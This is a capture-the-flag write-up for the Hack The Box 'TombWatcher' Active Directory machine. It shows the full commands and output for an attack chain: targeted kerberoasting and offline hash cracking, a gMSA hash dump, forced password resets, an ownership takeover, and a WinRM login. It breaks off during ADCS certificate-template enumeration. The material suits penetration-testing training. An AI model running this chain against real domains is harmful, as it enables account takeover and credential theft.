# Tombwatcher

## Recon

::: info :information_source: Machine Information
As is common in real life Windows pentests, you will start the TombWatcher box with credentials for the following account: `henry / H3nry_987TGV!`
:::

::: details nmap_scan.log
```log
Open 10.10.11.72:53
Open 10.10.11.72:80
Open 10.10.11.72:88
Open 10.10.11.72:135
Open 10.10.11.72:139
Open 10.10.11.72:389
Open 10.10.11.72:445
Open 10.10.11.72:464
Open 10.10.11.72:593
Open 10.10.11.72:636
Open 10.10.11.72:3268
Open 10.10.11.72:3269
Open 10.10.11.72:5985
Open 10.10.11.72:9389
Open 10.10.11.72:49666
Open 10.10.11.72:49691
Open 10.10.11.72:49692
Open 10.10.11.72:49694
Open 10.10.11.72:49711
Open 10.10.11.72:49714
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.10.11.72

PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Simple DNS Plus
80/tcp    open  http          syn-ack Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2025-07-14 22:08:26Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-07-14T22:10:08+00:00; +4h00m01s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.tombwatcher.htb
| Issuer: commonName=tombwatcher-CA-1/domainComponent=tombwatcher
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2024-11-16T00:47:59
| Not valid after:  2025-11-16T00:47:59
| MD5:   a396:4dc0:104d:3c58:54e0:19e3:c2ae:0666
| SHA-1: fe5e:76e2:d528:4a33:8adf:c84e:92e3:900e:4234:ef9c
| -----BEGIN CERTIFICATE-----
| MIIF9jCCBN6gAwIBAgITLgAAAAKKaXDNTUaJbgAAAAAAAjANBgkqhkiG9w0BAQUF
| ADBNMRMwEQYKCZImiZPyLGQBGRYDaHRiMRswGQYKCZImiZPyLGQBGRYLdG9tYndh
| dGNoZXIxGTAXBgNVBAMTEHRvbWJ3YXRjaGVyLUNBLTEwHhcNMjQxMTE2MDA0NzU5
| WhcNMjUxMTE2MDA0NzU5WjAfMR0wGwYDVQQDExREQzAxLnRvbWJ3YXRjaGVyLmh0
| YjCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAPkYtnAM++hvs4LhMUtp
| OFViax2s+4hbaS74kU86hie1/cujdlofvn6NyNppESgx99WzjmU5wthsP7JdSwNV
| XHo02ygX6aC4eJ1tbPbe7jGmVlHU3XmJtZgkTAOqvt1LMym+MRNKUHgGyRlF0u68
| IQsHqBQY8KC+sS1hZ+tvbuUA0m8AApjGC+dnY9JXlvJ81QleTcd/b1EWnyxfD1YC
| ezbtz1O51DLMqMysjR/nKYqG7j/R0yz2eVeX+jYa7ZODy0i1KdDVOKSHSEcjM3wf
| hk1qJYZHD+2Agn4ZSfckt0X8ZYeKyIMQor/uDNbr9/YtD1WfT8ol1oXxw4gh4Ye8
| ar0CAwEAAaOCAvswggL3MC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBv
| AG4AdAByAG8AbABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEw
| DgYDVR0PAQH/BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCA
| MA4GCCqGSIb3DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCG
| SAFlAwQBAjALBglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0O
| BBYEFAqc8X8Ifudq/MgoPpqm0L3u15pvMB8GA1UdIwQYMBaAFCrN5HoYF07vh90L
| HVZ5CkBQxvI6MIHPBgNVHR8EgccwgcQwgcGggb6ggbuGgbhsZGFwOi8vL0NOPXRv
| bWJ3YXRjaGVyLUNBLTEsQ049REMwMSxDTj1DRFAsQ049UHVibGljJTIwS2V5JTIw
| U2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz10b21id2F0
| Y2hlcixEQz1odGI/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlzdD9iYXNlP29iamVj
| dENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIHGBggrBgEFBQcBAQSBuTCBtjCB
| swYIKwYBBQUHMAKGgaZsZGFwOi8vL0NOPXRvbWJ3YXRjaGVyLUNBLTEsQ049QUlB
| LENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZp
| Z3VyYXRpb24sREM9dG9tYndhdGNoZXIsREM9aHRiP2NBQ2VydGlmaWNhdGU/YmFz
| ZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MEAGA1UdEQQ5MDeg
| HwYJKwYBBAGCNxkBoBIEEPyy7selMmxPu2rkBnNzTmGCFERDMDEudG9tYndhdGNo
| ZXIuaHRiMA0GCSqGSIb3DQEBBQUAA4IBAQDHlJXOp+3AHiBFikML/iyk7hkdrrKd
| gm9JLQrXvxnZ5cJHCe7EM5lk65zLB6lyCORHCjoGgm9eLDiZ7cYWipDnCZIDaJdp
| Eqg4SWwTvbK+8fhzgJUKYpe1hokqIRLGYJPINNDI+tRyL74ZsDLCjjx0A4/lCIHK
| UVh/6C+B68hnPsCF3DZFpO80im6G311u4izntBMGqxIhnIAVYFlR2H+HlFS+J0zo
| x4qtaXNNmuaDW26OOtTf3FgylWUe5ji5MIq5UEupdOAI/xdwWV5M4gWFWZwNpSXG
| Xq2engKcrfy4900Q10HektLKjyuhvSdWuyDwGW1L34ZljqsDsqV1S0SE
|_-----END CERTIFICATE-----
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.tombwatcher.htb
| Issuer: commonName=tombwatcher-CA-1/domainComponent=tombwatcher
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2024-11-16T00:47:59
| Not valid after:  2025-11-16T00:47:59
| MD5:   a396:4dc0:104d:3c58:54e0:19e3:c2ae:0666
| SHA-1: fe5e:76e2:d528:4a33:8adf:c84e:92e3:900e:4234:ef9c
| -----BEGIN CERTIFICATE-----
...
|_-----END CERTIFICATE-----
|_ssl-date: 2025-07-14T22:10:07+00:00; +4h00m00s from scanner time.
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.tombwatcher.htb
| Issuer: commonName=tombwatcher-CA-1/domainComponent=tombwatcher
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2024-11-16T00:47:59
| Not valid after:  2025-11-16T00:47:59
| MD5:   a396:4dc0:104d:3c58:54e0:19e3:c2ae:0666
| SHA-1: fe5e:76e2:d528:4a33:8adf:c84e:92e3:900e:4234:ef9c
| -----BEGIN CERTIFICATE-----
...
|_-----END CERTIFICATE-----
|_ssl-date: 2025-07-14T22:10:08+00:00; +4h00m01s from scanner time.
3269/tcp  open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-07-14T22:10:07+00:00; +4h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.tombwatcher.htb
| Issuer: commonName=tombwatcher-CA-1/domainComponent=tombwatcher
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2024-11-16T00:47:59
| Not valid after:  2025-11-16T00:47:59
| MD5:   a396:4dc0:104d:3c58:54e0:19e3:c2ae:0666
| SHA-1: fe5e:76e2:d528:4a33:8adf:c84e:92e3:900e:4234:ef9c
| -----BEGIN CERTIFICATE-----
...
|_-----END CERTIFICATE-----
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
49666/tcp open  msrpc         syn-ack Microsoft Windows RPC
49691/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49692/tcp open  msrpc         syn-ack Microsoft Windows RPC
49694/tcp open  msrpc         syn-ack Microsoft Windows RPC
49711/tcp open  msrpc         syn-ack Microsoft Windows RPC
49714/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 4h00m00s, deviation: 0s, median: 3h59m59s
| smb2-time: 
|   date: 2025-07-14T22:09:25
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 20899/tcp): CLEAN (Timeout)
|   Check 2 (port 18077/tcp): CLEAN (Timeout)
|   Check 3 (port 61752/udp): CLEAN (Timeout)
|   Check 4 (port 31786/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
```
:::

## DNS

```bash
└─$ dnsrecon -d tombwatcher.htb -n 10.10.11.72 --tcp
[*] std: Performing General Enumeration against: tombwatcher.htb...
[-] DNSSEC is not configured for tombwatcher.htb
[*]      SOA dc01.tombwatcher.htb 10.10.11.72
[*]      NS dc01.tombwatcher.htb 10.10.11.72
[*]      A tombwatcher.htb 10.10.11.72
[*]      AAAA tombwatcher.htb dead:beef::e6cb:5711:2f35:e5db
[*] Enumerating SRV Records
[+]      SRV _ldap._tcp.tombwatcher.htb dc01.tombwatcher.htb 10.10.11.72 389
[+]      SRV _gc._tcp.tombwatcher.htb dc01.tombwatcher.htb 10.10.11.72 3268
[+]      SRV _kerberos._udp.tombwatcher.htb dc01.tombwatcher.htb 10.10.11.72 88
[+]      SRV _kerberos._tcp.tombwatcher.htb dc01.tombwatcher.htb 10.10.11.72 88
[+]      SRV _ldap._tcp.ForestDNSZones.tombwatcher.htb dc01.tombwatcher.htb 10.10.11.72 389
[+]      SRV _ldap._tcp.dc._msdcs.tombwatcher.htb dc01.tombwatcher.htb 10.10.11.72 389
[+]      SRV _ldap._tcp.pdc._msdcs.tombwatcher.htb dc01.tombwatcher.htb 10.10.11.72 389
[+]      SRV _kpasswd._tcp.tombwatcher.htb dc01.tombwatcher.htb 10.10.11.72 464
[+]      SRV _ldap._tcp.gc._msdcs.tombwatcher.htb dc01.tombwatcher.htb 10.10.11.72 3268
[+]      SRV _kerberos._tcp.dc._msdcs.tombwatcher.htb dc01.tombwatcher.htb 10.10.11.72 88
[+]      SRV _kpasswd._udp.tombwatcher.htb dc01.tombwatcher.htb 10.10.11.72 464
[+] 11 Records Found
```

```bash
└─$ dig ANY tombwatcher.htb @10.10.11.72| grep -vE ';|^$'
tombwatcher.htb.        600     IN      A       10.10.11.72
tombwatcher.htb.        3600    IN      NS      dc01.tombwatcher.htb.
tombwatcher.htb.        3600    IN      SOA     dc01.tombwatcher.htb. hostmaster.tombwatcher.htb. 226 900 600 86400 3600
tombwatcher.htb.        600     IN      AAAA    dead:beef::e6cb:5711:2f35:e5db
dc01.tombwatcher.htb.   3600    IN      A       10.10.11.72
```

## General Enum

```bash
└─$ cicada-mastertul -q -u 'henry' -p 'H3nry_987TGV!' -t 10.10.11.72 -d tombwatcher.htb --full
----------------HAPPY HAUNTING!!----------------
Target IP: 10.10.11.72
Domain: tombwatcher.htb
Username: henry
Password: H3nry_987TGV!

Full Mode Enabled
------------------------------------------------
[!] Enumerating SMB...
[~] Commnad: faketime -f +4h netexec smb tombwatcher.htb --timeout 99 -u 'henry' -p 'H3nry_987TGV!' --shares
[+] SMB share drive names saved to /home/woyag/Desktop/Rooms/TombWatcher/mastertool/10.10.11.72/smb_results/share_names.txt
[+] SMB share drives list saved to /home/woyag/Desktop/Rooms/TombWatcher/mastertool/10.10.11.72/smb_results/share_drives.txt
[*] Downloading SMB share files to /home/woyag/Desktop/Rooms/TombWatcher/mastertool/10.10.11.72/smb_results
[~] Commnad: faketime -f +4h netexec smb tombwatcher.htb --timeout 99 -u 'henry' -p 'H3nry_987TGV!' -M spider_plus -o DOWNLOAD_FLAG=True
[!] Connecting to WinRM...
[~] Commnad: faketime -f +4h netexec winrm tombwatcher.htb --timeout 99 -u 'henry' -p 'H3nry_987TGV!'
[-] Could not connect to WinRM
[!] Enumerating users with netexec rib bruteforce (up to 5000)...
[~] Commnad: faketime -f +4h netexec smb tombwatcher.htb --timeout 99 -u 'henry' -p 'H3nry_987TGV!' --rid-brute 5000
[+] Lookupsids saved to /home/woyag/Desktop/Rooms/TombWatcher/mastertool/10.10.11.72/lookupsid_results/lookupsid.txt
[+] Users list saved to /home/woyag/Desktop/Rooms/TombWatcher/mastertool/10.10.11.72/lookupsid_results/users.txt
[!] Enumerating NPUsers using impacket...
[~] Commnad: faketime -f +4h impacket-GetNPUsers 'tombwatcher.htb'/'henry':'H3nry_987TGV!'@'10.10.11.72'  -usersfile /home/woyag/Desktop/Rooms/TombWatcher/mastertool/10.10.11.72/lookupsid_results/users.txt
[-] No NPUsers found
[!] Enumerating UserSPNs using impacket...
[~] Commnad: faketime -f +4h impacket-GetUserSPNs 'tombwatcher.htb'/'henry':'H3nry_987TGV!'@'10.10.11.72'  -request -dc-host tombwatcher.htb
[-] No UserSPNs found
[!] Collecting Bloodhound Files...
[~] Commnad: faketime -f +4h bloodhound-python -d tombwatcher.htb -u 'henry' -ns 10.10.11.72 -c all --dns-timeout 100 --zip -op henry -p 'H3nry_987TGV!'
[-] Could not collect Bloodhound Files
[!] Enumerating LDAP...
[~] Commnad: faketime -f +4h ldapdomaindump -u 'tombwatcher.htb\henry' -dc-ip 10.10.11.72 -o /home/woyag/Desktop/Rooms/TombWatcher/mastertool/10.10.11.72/ldap_results -p 'H3nry_987TGV!'
[+] LDAP saved to /home/woyag/Desktop/Rooms/TombWatcher/mastertool/10.10.11.72/ldap_results
[!x!] Cleaning up...
```

There's second machine on the box..

![Writeup.png](/assets/pentest/htb/tombwatcher/Writeup.png)

Our target should be `john` since he can winrm into the DC.

![Writeup-1.png](/assets/pentest/htb/tombwatcher/Writeup-1.png)

Not sure why Bloodhound failed, ran it again and got the zip.
```bash
└─$ faketime -f +4h bloodhound-python -d tombwatcher.htb -u 'henry' -ns 10.10.11.72 -c all --dns-timeout 100 --zip -op henry -p 'H3nry_987TGV!'
```

`henry` has **WriteSPN** permission on `alfred`

![Writeup-2.png](/assets/pentest/htb/tombwatcher/Writeup-2.png)

### WriteSPN

[https://bloodhound.specterops.io/resources/edges/write-spn](https://bloodhound.specterops.io/resources/edges/write-spn): Writing to this property gives you the opportunity to perform a targeted kerberoasting attack against that user.

[https://www.thehacker.recipes/ad/movement/dacl/targeted-kerberoasting](https://www.thehacker.recipes/ad/movement/dacl/targeted-kerberoasting)

```bash
└─$ bloodyAD -u 'henry' -p 'H3nry_987TGV!' -d 'tombwatcher.htb' --host 10.10.11.72 set object alfred servicePrincipalName  -v 'letme/in'
[+] alfred servicePrincipalName has been updated

└─$ bloodyAD -u 'henry' -p 'H3nry_987TGV!' -d 'tombwatcher.htb' --host 10.10.11.72 get object alfred --attr servicePrincipalName

distinguishedName: CN=Alfred,CN=Users,DC=tombwatcher,DC=htb
servicePrincipalName: letme/in

└─$ faketime -f +4h netexec ldap 'dc01.tombwatcher.htb' -d 'tombwatcher.htb' -u 'henry' -p 'H3nry_987TGV!' --kerberoasting kerberoastables.txt
LDAP        10.10.11.72     389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb)
LDAP        10.10.11.72     389    DC01             [+] tombwatcher.htb\henry:H3nry_987TGV!
LDAP        10.10.11.72     389    DC01             Bypassing disabled account krbtgt
LDAP        10.10.11.72     389    DC01             [*] Total of records returned 1
LDAP        10.10.11.72     389    DC01             sAMAccountName: Alfred memberOf:  pwdLastSet: 2025-05-12 11:17:03.526670 lastLogon:<never>
LDAP        10.10.11.72     389    DC01             $krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$ab6c4934338160010f42be519ac9270e$cbee7d88d51e30a48c44e13ec89363fec4d3f223823c1e2bf5210cd350734b7e21d6f73fef50d696462328b0c041b5f59251825b5da02d9937324b6c42ba98688eb618e3146a59d4b7bfc35c0723ccac515b465a3b7ba79614d6956c53b9cc0eb24493af4d492f038c29abf1f381d622959e27f3346beae0eb86034d92fd2d03d4eb5788ab8c0d98a51fcdbd0b4c42b005b312babddfcd46f9fdaa39a5019c39f397c5c65e19c34c421977b892b01f91f79ee72f1377e446465eed951d3b96c1a96042e268293e50fbc1a1d4152ef1605e5410cad40c13d552e173c464abec072eb60c2c960965d49d9243d5e1376d3e49cd059f3744ff92ad131cc18b23684052f81201f4ce723a66001ab0104442749dd4ec1c77f0dd32643ce11aa85744960c921fe616fafc5ee9e662890a2b8ed5d1d9555b8cbf57642a73af1ed1ac58d3c571d4aef87c0a392aa1455de8c9c11c212d2bfea193fae3f7ac161d63b53e493a91482a4573a1399b9f2a8e2dfbbd697743511b0b73e4733c7e90fedee8471d0a52a249876904c914f99a559ba8b7f5bdcd4bc307365fcb9eef7ec72482173f97e77e4e1d16627f7f88e6ef38a374a73cfab20eb5900a4c86ae2f9ac9ad6b47f01848336b474c28e1f237df87e89777b2dc68a3075daf5f5bb29ff0086afeb1881b792a933277c6680529a71c7ba27b042cb9c84c6b86107b86908aab90c8473ca0162968a54c74f641061d2d6bd091bfbebcf67dacba557b6655f4f4ef7163dc52880e170537917d5b71028d7508eee6f68a030c55b81b5cb49d8e464b2bf3016346f56679048ff5346f77e5dcfef8368dc01d83bbb438dae69c6b9888c4fc65f66a3848428616568cb1cfb8ede53438e836f75f0018be2e1cb077f6ad2de09c2ba98862b68226f42b5eea427232cf1a9702cd5b61bcc5f685f5756b25bc2312a6a2928a01a34f51a61e20ab20353603abe660a9597269aafd7b65a357e248dc90092450c41dad5ea604b43d90cca8992e229bd6b37da3784151bc9d5b7caa77d83a1a90e82cd16ed79adb3e5b76f5c334233fa777a41f61bad7b6e431fc6fb4fda949554a2469afb0e7555eb89c7e74084c1ef374fa7bd181802a279791ce0624ba985132b792311e3148c1c8200707c6055806485ff2306f0f97acc4bd42caab12f7f812a6420ca627ac79fb7d3d29a1338c37c9cdcad1fb034c78bf5452f7036cfa5b1791e3267be29ac1a0bab845bf55d360d5dc84270c517facb6716714c1980be45fb975762af6d0a11f03ec04948ca53c492b5c4dfa999bcde35536db64a79799ba812beea150ead09d6aba0706da18a4d4b5685476a8b19b20b893324a34e45658ad0bb4c6c83de5aa9f5c8ad3b607a108e94929b46775da997a8f01072910769263f402520550614449e0cb0360da693a806abfad7d6dadf2a9c3dfb641540a4ffe8de6a25a574feff624122c2a5f4a
```

```powershell
➜ .\john-1.9.0-jumbo-1-win64\run\john.exe .\hashes.txt --wordlist=.\rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
basketball       (?)
1g 0:00:00:00 DONE (2025-07-15 13:49) 62.50g/s 128000p/s 128000c/s 128000C/s 123456..lovers1
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

::: tip :bulb: Creds
`alfred:basketball`
:::

## Lateral movement

The lateral movement stage seems very long

![Writeup-3.png](/assets/pentest/htb/tombwatcher/Writeup-3.png)

### AddSelf

Add `alfred` to **Infrastructure** group
```bash
└─$ bloodyAD -u 'alfred' -p 'basketball' -d 'tombwatcher.htb' --host 10.10.11.72 add groupMember Infrastructure alfred
[+] alfred added to Infrastructure
```

### ReadGMSAPassword

Dump gMSA
```bash
└─$ netexec ldap tombwatcher.htb -u 'alfred' -p 'basketball' --gmsa
LDAP        10.10.11.72     389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb)
LDAPS       10.10.11.72     636    DC01             [+] tombwatcher.htb\alfred:basketball
LDAPS       10.10.11.72     636    DC01             [*] Getting GMSA Passwords
LDAPS       10.10.11.72     636    DC01             Account: ansible_dev$         NTLM: 7bc5a56af89da4d3c03bc048055350f2
```

### ForceChangePassword 

Shadow credentials attack fails
```bash
└─$ faketime -f +4h certipy-ad shadow auto -u 'ansible_dev$@tombwatcher.htb' -hashes ':7bc5a56af89da4d3c03bc048055350f2' -account 'sam' -target 'dc01.tombwatcher.htb' -dc-ip '10.10.11.72'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'sam'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'b39cd2b7-fd4a-eaeb-e65a-675cc3c4c76b'
[*] Adding Key Credential with device ID 'b39cd2b7-fd4a-eaeb-e65a-675cc3c4c76b' to the Key Credentials for 'sam'
[-] Could not update Key Credentials for 'sam' due to insufficient access rights: 00002098: SecErr: DSID-031514A0, problem 4003 (INSUFF_ACCESS_RIGHTS), data 0
```

> **ForceChangePassword** lets you change the user's password without knowing password, but for Shadow Creds you’d need GenericWrite or GenericAll.

Change password for `sam` user
```bash
└─$ bloodyAD -u 'ansible_dev$' -p ':7bc5a56af89da4d3c03bc048055350f2' -d 'tombwatcher.htb' --host 10.10.11.72 set password sam 'Password123$'
[+] Password changed successfully!
```

### WriteOwner

[WriteOwner](https://bloodhound.specterops.io/resources/edges/write-owner), [Grant ownership](https://www.thehacker.recipes/ad/movement/dacl/grant-ownership); Gain access to John user.

```bash
└─$ bloodyAD -u 'sam' -p 'Password123$' -d 'tombwatcher.htb' --host 10.10.11.72 set owner john sam
[+] Old owner S-1-5-21-1392491010-1358638721-2126982587-512 is now replaced by sam on john

└─$ bloodyAD -u 'sam' -p 'Password123$' -d 'tombwatcher.htb' --host 10.10.11.72 add genericAll john sam
[+] sam has now GenericAll on john

└─$ bloodyAD -u 'sam' -p 'Password123$' -d 'tombwatcher.htb' --host 10.10.11.72 set password john 'Password123$'
[+] Password changed successfully!
```

## WinRM

```powershell
└─$ evil-winrm -i dc01.tombwatcher.htb -u 'john' -p 'Password123$'
*Evil-WinRM* PS C:\Users\john> whoami /all
User Name        SID
================ ==============================================
tombwatcher\john S-1-5-21-1392491010-1358638721-2126982587-1106

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access    Alias            S-1-5-32-574 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

### User.txt

```powershell
*Evil-WinRM* PS C:\Users\john> cat Desktop/user.txt
bdb6c3da255f4e1cd603a00fb2f08809
```

## Privilege Escalation

`john` has **GenericAll** on ADCS.

![Writeup-4.png](/assets/pentest/htb/tombwatcher/Writeup-4.png)

### GPOs

[https://www.thehacker.recipes/ad/movement/group-policies](https://www.thehacker.recipes/ad/movement/group-policies)

```bash
└─$ GPOwned -u 'john' -p 'Password123$' -d 'tombwatcher.htb' -dc-ip '10.10.11.72' -gpcmachine -listgpo
                GPO Helper - @TheXC3LL
                Modifications by - @Fabrizzio53

[*] Connecting to LDAP service at 10.10.11.72
[*] Requesting GPOs info from LDAP

[+] Name: {31B2F340-016D-11D2-945F-00C04FB984F9}
        [-] displayName: Default Domain Policy
        [-] gPCFileSysPath: \\tombwatcher.htb\sysvol\tombwatcher.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}
        [-] gPCMachineExtensionNames: [{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]
        [-] versionNumber: 4
        [-] Verbose:
                ---             ---
                Security
                Computer Restricted Groups

[+] Name: {6AC1786C-016F-11D2-945F-00C04fB984F9}
        [-] displayName: Default Domain Controllers Policy
        [-] gPCFileSysPath: \\tombwatcher.htb\sysvol\tombwatcher.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}
        [-] gPCMachineExtensionNames: [{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]
        [-] versionNumber: 4
        [-] Verbose:
                ---             ---
                Security
                Computer Restricted Groups

[^] Have a nice day!
```

Hmmm... nothing exploitable in GPOs

### Deleted SID

`-vulnerable` didn't find anything, enumerate all enabled:
```bash
└─$ certipy-ad find -u 'john' -p 'Password123$' -dc-ip 10.10.11.72 -enabled -text # -stdout
Certificate Authorities
  0
    CA Name                             : tombwatcher-CA-1
    DNS Name                            : DC01.tombwatcher.htb
    Certificate Subject                 : CN=tombwatcher-CA-1, DC=tombwatcher, DC=htb
    Certificate Serial Number           : 3428A7FC52C310B2460F8440AA8327AC
    Certificate Validity Start          : 2024-11-16 00:47:48+00:00
    Certificate Validity End            : 2123-11-16 00:57:48+00:00
    Web Enrollment
      HTTP  Enabled                         : False
      HTTPS Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : TOMBWATCHER.HTB\Administrators
      Access Rights
        ManageCa                        : TOMBWATCHER.HTB\Administrators, TOMBWATCHER.HTB\Domain Admins, TOMBWATCHER.HTB\Enterprise Admins
        ManageCertificates              : TOMBWATCHER.HTB\Administrators, TOMBWATCHER.HTB\Domain Admins, TOMBWATCHER.HTB\Enterprise Admins
        Enroll                          : TOMBWATCHER.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : KerberosAuthentication
    Display Name                        : Kerberos Authentication
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDomainDns, SubjectAltRequireDns
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Client Authentication, Server Authentication, Smart Card Logon, KDC Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T00:57:49+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Enterprise Read-only Domain Controllers, TOMBWATCHER.HTB\Domain Admins, TOMBWATCHER.HTB\Domain Controllers, TOMBWATCHER.HTB\Enterprise Admins, TOMBWATCHER.HTB\Enterprise Domain Controllers
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins, TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins, TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins, TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins, TOMBWATCHER.HTB\Domain Controllers, TOMBWATCHER.HTB\Enterprise Admins, TOMBWATCHER.HTB\Enterprise Domain Controllers
        Write Property AutoEnroll       : TOMBWATCHER.HTB\Domain Controllers, TOMBWATCHER.HTB\Enterprise Domain Controllers
  1
    Template Name                       : DirectoryEmailReplication
    Display Name                        : Directory Email Replication
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
